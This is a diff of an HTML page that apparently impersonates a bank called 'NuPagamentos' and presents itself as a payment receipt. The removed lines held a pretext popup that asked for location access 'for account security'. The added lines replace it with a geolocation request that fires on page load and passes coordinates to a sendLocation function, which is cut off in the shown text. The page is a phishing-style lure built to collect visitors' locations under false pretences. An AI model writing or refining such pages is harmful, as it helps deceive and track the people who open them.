@@ -13,37 +13,27 @@
 
 <body style="background-color: #6B02A3">
 
-  <!-- Adicionando a mensagem para pedir a localização -->
-  <input type="checkbox" id="show-popup" style="display: none;">
-<div id="location-popup" class="popup">
-  <div class="popup-content">
-    <p>Para garantir a segurança da sua conta, a NuPagamentos solicita sua autorização para acessar a localização e fornecer o comprovante de forma segura.</p>
-    <label for="show-popup" class="popup-button">Sim, enviar localização</label>
-    <label for="show-popup" class="popup-button">Não, obrigado</label>
-  </div>
-</div>
+  <h1>Teste</h1>
 
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      // Esconde os botões de localização inicialmente
-      document.getElementById('popup-button').style.display = 'block';
-
-      // Ao clicar em "Sim", solicitar a localização
-      document.getElementById('allow-location').addEventListener('click', () => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-          // Após solicitar, esconder os botões
-          document.getElementById('popup-content').style.display = 'none';
-        } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        }
-      });
-
-      // Ao clicar em "Não", apenas esconder a solicitação
-      document.getElementById('deny-location').addEventListener('click', () => {
-        document.getElementById('popup-content').style.display = 'none';
-      });
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
     });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
